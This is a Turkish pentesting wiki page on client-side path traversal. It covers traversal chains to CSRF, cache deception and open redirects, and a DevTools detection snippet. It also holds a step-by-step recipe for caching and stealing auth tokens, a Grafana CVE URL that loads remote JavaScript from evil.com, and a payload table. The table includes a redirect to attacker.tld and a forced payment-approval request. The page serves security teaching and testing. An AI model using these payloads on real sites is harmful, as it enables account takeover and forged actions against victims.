# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

A client side path traversal, bir kullanıcının "meşru şekilde ziyaret etmesi için gönderilecek" veya kullanıcının örneğin JS veya CSS aracılığıyla "zorlanarak ziyaret ettirileceği" bir URL yolunu **manipüle edebilmeniz** durumunda ortaya çıkar. CSPT, kurbanın tarayıcısını aynı origin içindeki rastgele yollara çerezleri, JWTs veya mTLS sertifikaları ile istek yapmaya zorladığı için **On-Site Request Forgery (OSRF)** olarak da bilinir.

Tipik kaynaklar (kontrol ettiğiniz veriler):

- Route parametreleri ki bunlar `fetch()` veya XHR yollarına birleştiriliyor (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Arka plan işleri, service workers veya WebSocket URL'leri içinde yollara interpolasyon yapılan kaydedilmiş değerler (profile slugs, document IDs).
- İstek gönderilmeden önce API endpoint'lerine kullanıcı kontrollü parçalar veya dosya uzantıları ekleyen UI araçları (download/export butonları, image galerileri).

Tipik hedefler (traversal'ın indiği yerler):

- `/api/` veya `/proxy/` öneki ekleyen ve auth headers'ı otomatik olarak yeniden kullanan frontend API wrapper'ları.
- Daha sonra hydration sırasında URL'leri yeniden oluşturan `history.pushState` / `router.navigate` yardımcıları.
- CMS içeriği veya feature-flag payload'ları tarafından üretilen `<link>`/`<style>`/`@import` ifadeleri.

### Yaygın etkiler ve zincirler

- **CSPT ➜ CSRF/OSRF**: amaçlanan kaynak yolundan çıkarak kimlikli `POST/PUT/DELETE` çağrılarını ele geçirmek, ardından hassas endpoint'lere yeniden girerek (şifre sıfırlama, ödeme onayı, erişim iptali) yetki yükseltmek. Tırmanış için [CSRF](csrf-cross-site-request-forgery.md) checklist'i ile birleştirin.
- **CSPT ➜ cache deception / poisoning**: kamuya açık CDN anahtarlarından attacker-controlled JSON servis ederek bunu kimliksizlikle yeniden oynatmak. Bakınız [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal, bir open redirect endpoint'ine iner; bu endpoint daha sonra attacker altyapısına yönlendirir ve oradan kötü amaçlı JS veya SSRF payload'ları sunulur. Zinciri [Open Redirect](open-redirect.md) suistimalleri ile genişletin.

### Örnek bulgular

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), invite URL'ini **değiştirmenin** mümkün olduğu ve bunun sonucunda bir kartın **iptal edilmesine** yol açtığı görüldü.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), bir **client side path traversal via CSS** (CSS kaynağının yüklendiği yolu değiştirmek mümkündü) ile bir **open redirect** birleştirilerek CSS kaynağının **attacker controlled domain**'den yüklenmesi sağlanabiliyordu.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), CSPT'nin **CSRF saldırısı gerçekleştirmek** için nasıl suistimal edilebileceğine dair bir teknik gösteriliyor. Bu, saldırganın kontrol edebileceği tüm verileri (URL path, parametreler, fragment, veritabanına enjekte edilen veri...) **ve bu verilerin indiği sink'leri** (yapılan istekleri) izleyerek yapılır.
- Bunu izlemek için [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) kontrol edin.
- Tekniği denemek için [**CSPT playground**](https://github.com/doyensec/CSPTPlayground)'a bakın.
- Tarayıcı eklentisini playground'da nasıl kullanacağınızı anlatan [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html)'ı inceleyin.

## CSPT-assisted web cache poisoning/deception

CSPT, extension-based CDN caching ile zincirlenerek authenticated API çağrılarıyla leaked olan hassas JSON'un exfiltrate edilmesine yol açabilir:

- Bir frontend, kullanıcı kontrollü girişi API yoluna birleştirir ve fetch/XHR içinde authentication header'ları ekler.
- Dot-segments (../) enjekte ederek kimlikli isteği aynı origin'deki farklı bir endpoint'e hedefleyebilirsiniz.
- Eğer o endpoint (veya .css gibi statik görünen bir sonek ile yol varyantı) CDN tarafından auth header'larına göre varye edilmeden cache'leniyorsa, kurbanın kimlikli yanıtı bir public cache anahtarı altında saklanabilir ve herkes tarafından elde edilebilir.

Hızlı reçete:

1) Auth header'ları gönderilirken path parametrelerinden API URL'leri oluşturan SPA kodunu bulun.
2) Hassas endpoint'leri belirleyin ve CDN'in JSON döndürürken Cache-Control: public/max-age ve X-Cache: Hit'e geçip geçmediğini görmek için statik sonekler (.css, .js, .jpg, .json) test edin.
3) Kurbanı, SPA parametresine traversal enjekte eden bir URL'ye yönlendirin, böylece kimlikli fetch cache'lenebilir yol varyantına çarpsın (ör. ../../../v1/token.css).
4) Aynı URL'i anonim olarak geri okuyarak cache'lenmiş sırrı edinin (token → ATO).

Ayrıntılar ve hafifletmeler için Cache Deception sayfasına bakın: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Tespit iş akışı ve araçlar

### Araya giren proxy'lerle pasif keşif

- **Kaynaklar/sink'leri otomatik olarak ilişkilendirin**: [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) proxy geçmişinizi parse eder, daha sonra diğer isteklerin path'leri içinde yansıtılan parametreleri kümeleyip kanarya token'lı PoC URL'leri yeniden gönderebilir ve sömürülebilir traversalları doğrulayabilir. JAR'ı yükledikten sonra `Source Scope`'u client parametrelerine (ör. `id`, `slug`) ve `Sink Methods`'ı `GET, POST, DELETE` olarak ayarlayın ki extension tehlikeli istek oluşturucularını vurgulasın. Tüm şüpheli kaynakları gömülü bir canary ile topluca dışa aktarabilirsiniz.
- **Çifte URL-dekodlamaya dikkat edin**: Burp veya ZAP ile gezinirken, frontend tarafından normalize edilmeden önce `/api/%252e%252e/` pattern'lerini arayın—bunlar genellikle route state'e referans veren base64-encoded JSON gövdeleri olarak görünür ve otomatik bir tarayıcı olmadan gözden kaçması kolaydır.

### SPA sink'larını manuel olarak enstrümante etmek

DevTools'a kısa bir snippet bırakmak, UI ile etkileşime girerken gizli traversalları görünür kılmanıza yardımcı olur:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- `XMLHttpRequest.prototype.open`, `history.pushState` ve framework-özgü router'lar (örn. `next/router`) etrafında benzer sarmalayıcılar ekleyin. `init.credentials === "include"` için izlemek, oturum çerezleri taşıyan istekleri hızlıca daraltır.
- Uygulama routing ipuçlarını IndexedDB/localStorage'da saklıyorsa, bu girişleri traversal payload'ları ile düzenleyip yeniden yükleyin — mutasyona uğramış state genellikle pre-hydration sırasında isteklere yeniden enjekte edilir.

### Lab & payload rehearsal

- `docker compose up` ile CSPT Playground'u ayağa kaldırın ve hedefe dokunmadan traversal ➜ CSRF ➜ stored XSS zincirlerini pratik yapın. Hedefin router yapısını yerel olarak yeniden üretmek, paylaşılabilir PoC'lar hazırlamayı kolaylaştırır.
- Recon sırasında gözlemlediğiniz başarılı dot-segment varyasyonlarının (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) ve son ek hilelerinin (`.css`, `.json`, `;` matrix params) bir not defteri tutun, böylece yeni bir sink ortaya çıktığında bunları hızlıca yeniden oynatabilirsiniz.

## Recent case studies (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – `/public/plugins/` içinde bir traversal gadget'i, saldırganların plugin asset loader'a `../../` kaçırmasına izin verdi, bunu Grafana’nın open redirect'i ile zincirleyip kurbanları saldırgan kontrollü plugin bundle'larını yüklemeye zorladı. Anonymous dashboards etkinleştirildiğinde, `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` gibi crafted bir URL tarayıcının uzak JavaScript çalıştırmasına neden oldu; Image Renderer plugin yüklüyse, aynı primitive render isteklerini iç hostlara yönlendirerek SSRF'e çevrilebiliyordu. Plugin asset path'lerini, anonymous dashboards ve renderer endpoint'lerini birlikte test edin çünkü tek bir traversal genellikle hem XSS hem de SSRF açıları sunar.

## Payload cookbook

| Hedef | Payload pattern | Notlar |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Routerlar basitçe `/${doc}` ekliyorsa çalışır. CDN sadece statik görünen varlıkları cache'liyorsa `.json` ekleyin. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Hedefin codebase'inde listelenen trusted redirectors ile birleştirin. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN `.css`'i statik olarak değerlendirip JSON olarak dönen gizli verileri cache'leyebilir. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Bazı routerlar `_method` override'larını kabul eder; traversal ile eşleştirip yıkıcı endpoint'leri yeniden hedeflemek için kullanın. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
